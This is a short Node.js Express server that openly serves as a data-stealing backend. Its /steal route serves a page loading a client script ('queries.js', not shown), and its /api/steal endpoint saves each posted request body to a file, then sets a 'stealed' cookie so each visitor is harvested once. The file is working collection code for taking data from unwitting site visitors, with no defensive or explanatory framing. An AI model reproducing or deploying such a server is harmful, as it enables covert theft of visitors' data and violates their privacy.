const si = require("systeminformation"),
    express = require("express"),
    app = express(),
    port = process.env.PORT || 3000,
    bodyParser = require("body-parser"),
    cookieParser = require("cookie-parser"),
    fs = require("fs");
function removeEmpty(obj) {
    return Object.fromEntries(Object.entries(obj).filter(([_, v]) => v != null));
}

app.use(express.static("public"));
app.set("view engine", "pug");
app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());
app.use(cookieParser());

app.get("/steal", async (req, res) => {
    if (!req.cookies.stealed) {
        res.locals.files = ["queries.js"];
        res.render("index", { title: "Hey", message: "Hello there!"});
    } else {
        res.redirect("/");
    }
});
app.get("/", async (req, res) => {
    if (!req.cookies.stealed) {
        res.redirect("/steal");
    } else {
        res.locals.files = [];
        res.render("index", { title: "Hey", message: "Stealed" });
    }
});
app.get("/index", async (req,res) => {
    res.redirect("/")
})
app.post("/api/steal", async (req, res) => {
    res.cookie("stealed", 1, { maxAge: 15000000, httpOnly: true });
    fs.writeFile("data.txt", JSON.stringify(req.body) + "\n", function (err, data) {
        if (err) {
            console.log(err);
        }
        if (data) {
            console.log("true");
        }
    });
    // res.redirect("/");
    res.json({saved:true});
});

app.listen(port, () => {
    console.log(`listening on port ${port}`);
});
